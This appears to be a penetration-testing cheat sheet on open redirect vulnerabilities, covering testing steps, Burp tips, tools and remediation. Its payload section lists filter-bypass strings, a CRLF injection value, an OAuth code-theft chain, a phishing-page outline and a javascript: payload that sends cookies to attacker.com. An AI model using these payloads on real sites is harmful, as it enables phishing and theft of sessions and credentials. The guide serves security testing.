# Open Redirect

## Overview
An Open Redirect vulnerability occurs when an application accepts a user-controlled URL as input and redirects the user to that URL without validating that it belongs to an approved domain. These flaws exist because redirect parameters are extremely common (for post-login flows, logout, OAuth callbacks, etc.) and developers often rely on weak validation that is easy to bypass. Open redirects are most often exploited for phishing attacks, OAuth token theft, and as links in phishing campaigns that leverage the trusted domain's reputation.

## How It Works
A typical flow looks like this:
```
https://bank.com/login?next=https://attacker.com/phish
```
After login, the server (or client-side JavaScript) reads the `next` parameter and redirects the user there. If the server sends `Location: https://attacker.com/phish`, the browser follows the redirect. The user sees a URL at `bank.com` in their address bar before the redirect, lending false credibility to the link. The attack is especially effective in phishing emails because spam filters see the trusted domain name, and users who hover over the link see `bank.com`.

## Impact
- Phishing — victims are redirected to convincing fake login pages after clicking what appears to be a legitimate link
- OAuth token theft — redirect_uri manipulation in OAuth flows to steal authorization codes
- Credential theft chained with SSO flows
- Bypassing referrer-based access controls that check the `Referer` header
- SSRF pre-condition in some server-side redirect implementations
- Malware distribution by redirecting to drive-by download pages
- Reflected XSS via `javascript:` scheme open redirects

## Where to Look
- Login and logout redirect parameters: `?next=`, `?redirect=`, `?return=`, `?returnUrl=`, `?dest=`, `?goto=`, `?url=`, `?target=`, `?redir=`, `?destination=`
- OAuth `redirect_uri` parameter
- Password reset links with redirect parameters
- Email confirmation links
- `Location` headers in HTTP 301/302/303/307/308 responses
- JavaScript-based redirects: `window.location`, `document.location`, `location.href`, `location.replace()`
- `<meta http-equiv="refresh">` tags with user-controlled URL
- API responses that return a URL for the client to follow

## Testing Steps
1. Enumerate all redirect parameters across the application using Burp Suite's Param Miner or manual review.
2. Submit an external URL as the redirect value and follow the response:
   ```
   GET /login?next=https://attacker.com HTTP/1.1
   ```
3. Observe whether the response redirects to `attacker.com` (status 3xx with `Location: https://attacker.com`).
4. If blocked, try bypass techniques (see Payloads section).
5. Test JavaScript-based redirects by checking the page source for redirect handling.
6. Test `javascript:` scheme: `?next=javascript:alert(1)` — successful execution = XSS via redirect.
7. Test the OAuth `redirect_uri` parameter for open redirect acceptance.
8. Check for whitelist bypass using subdomains: `?next=https://attacker.com.trusted.com`.
9. Try URL confusion attacks with `@` character: `?next=https://trusted.com@attacker.com`.
10. Verify impact by building a full phishing scenario that chains the redirect to a fake login page.

## Payloads / Techniques

Basic redirect:
```
?next=https://attacker.com
?redirect_uri=https://attacker.com
?url=//attacker.com
?return=https://attacker.com/phish
```

Protocol-relative URL (bypasses http/https checks):
```
?next=//attacker.com
?next=\/\/attacker.com
?next=/\/attacker.com
```

XSS via javascript: scheme:
```
?next=javascript:alert(document.cookie)
?redirect=javascript:window.location='https://attacker.com/?c='+document.cookie
```

Bypass with whitelist confusion — `@` character:
```
https://target.com/login?next=https://trusted.com@attacker.com
# Browser treats 'trusted.com' as credentials and navigates to attacker.com
```

Bypass with subdomain trick:
```
?next=https://trusted.com.attacker.com
?next=https://attacker.com/trusted.com
```

Bypass with URL encoding:
```
?next=https:%2F%2Fattacker.com
?next=https:%252F%252Fattacker.com   (double encoded)
?next=%68%74%74%70%73:%2F%2Fattacker.com
```

Bypass with URL fragments:
```
?next=https://attacker.com#trusted.com
?next=https://trusted.com#@attacker.com
```

Bypass with CRLF injection in redirect URL:
```
?next=https://trusted.com%0d%0aLocation:https://attacker.com
```

Bypass with null bytes or path manipulation:
```
?next=https://trusted.com%00https://attacker.com
?next=https://trusted.com%2F..%2F@attacker.com
```

Bypass with open redirect chaining (if only paths are allowed):
```
?next=/logout?next=https://attacker.com   (chain two redirects)
```

Whitelist bypass — if only checking for prefix match on trusted.com:
```
?next=https://trusted.com.evil.com
?next=https://trusted.com%2fattacker.com
```

OAuth redirect_uri open redirect for token theft:
```
# Step 1: Initiate OAuth flow with manipulated redirect_uri
https://provider.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback?next=https://attacker.com&response_type=code

# Step 2: After auth, code is in URL, attacker.com captures it from Referer header
```

Full phishing chain using open redirect:
```
Email to victim:
"Click here to verify your account: https://trusted-bank.com/login?next=https://attacker.com/phish"

Attacker's page (https://attacker.com/phish):
- Exact clone of trusted-bank.com login page
- Captures submitted credentials and sends to attacker
- Then redirects victim back to real bank.com
```

curl test:
```bash
curl -s -o /dev/null -D - "https://target.com/login?next=https://attacker.com" | grep -i location
# If Location header points to attacker.com — vulnerable
```

## Burp Suite Tips
- Use **Param Miner** to discover hidden redirect parameters across the application.
- In **Intruder**, use a wordlist of common redirect parameter names (`next`, `redirect`, `url`, `dest`, `return`, `goto`, `target`, `redir`, `callback`, `destination`) to discover all endpoints.
- In **Repeater**, test bypass techniques one by one against each redirect endpoint.
- Enable **Follow redirects** in Repeater options to trace the full redirect chain.
- Search Proxy history for responses with status codes 301, 302, 303, 307, 308 and inspect `Location` headers.
- For OAuth redirect_uri testing, use **Logger++** to capture all redirect flows in detail.
- Use **Burp Collaborator** as the target of a redirect to confirm server-side redirect execution (for SSRF-chained scenarios).

## Tools
- Burp Suite — primary testing platform
- OpenRedireX (https://github.com/devanshbatham/OpenRedireX) — automated open redirect fuzzer
- qsreplace (tomnomnom) — replace query string parameter values in bulk
- waybackurls / gau — discover historical URLs with redirect parameters
- httpx — probe for redirect behavior at scale
- ffuf — fuzz redirect parameter values
- curl — manual testing with `-L` flag to follow redirects

## Remediation
- Avoid accepting user-controlled URLs for redirects entirely — use indirect references such as numeric IDs that map to allowed destination URLs.
- If URL-based redirects are necessary, maintain a strict allowlist of permitted destinations and validate against it using exact match (not substring or prefix).
- Implement server-side validation that checks the full scheme, host, and port: only allow relative paths or URLs whose host exactly matches the application's own domain.
- Never use client-side JavaScript to perform redirects based on query parameters without strict validation.
- For OAuth flows, use exact match `redirect_uri` validation and register redirect URIs in advance.
- Return an error page asking the user to confirm before redirecting when an external URL is detected.
- Set `Referrer-Policy: no-referrer` to prevent token leakage via Referer header when redirecting.

## References
https://portswigger.net/web-security/oauth/preventing
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect
https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet
https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
https://portswigger.net/research/hunting-evasive-vulnerabilities
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md
